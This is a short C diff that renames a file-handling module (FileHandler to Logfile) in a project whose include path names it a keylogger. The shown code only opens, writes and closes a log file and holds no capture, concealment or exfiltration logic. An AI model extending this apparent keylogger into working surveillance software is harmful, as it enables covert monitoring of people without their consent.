@@ -2,10 +2,10 @@
 #include <stddef.h>
 #include <stdio.h>
 #include <string.h>
-#include "keylogger/file_handler.h"
+#include "keylogger/utils/log_file.h"
 
 
-int FileHandler_init(FileHandler *fh)
+int Logfile_init(Logfile *fh)
 {
     fh->filename = NULL;
     fh->mode = NULL;
@@ -33,7 +33,7 @@ int FileHandler_init(FileHandler *fh)
     return 0;
 }
 
-int FileHandler_write(FileHandler *fh, const char *text)
+int Logfile_write(Logfile *fh, const char *text)
 {
     if (fprintf(fh->file, "%s", text) < 0) {
         fprintf(stderr, "Error writing file\n");
@@ -42,7 +42,7 @@ int FileHandler_write(FileHandler *fh, const char *text)
     return 0;
 }
 
-int FileHandler_close(FileHandler *fh) {
+int Logfile_close(Logfile *fh) {
     int flag_error = 0;
 
     if (fh->filename){
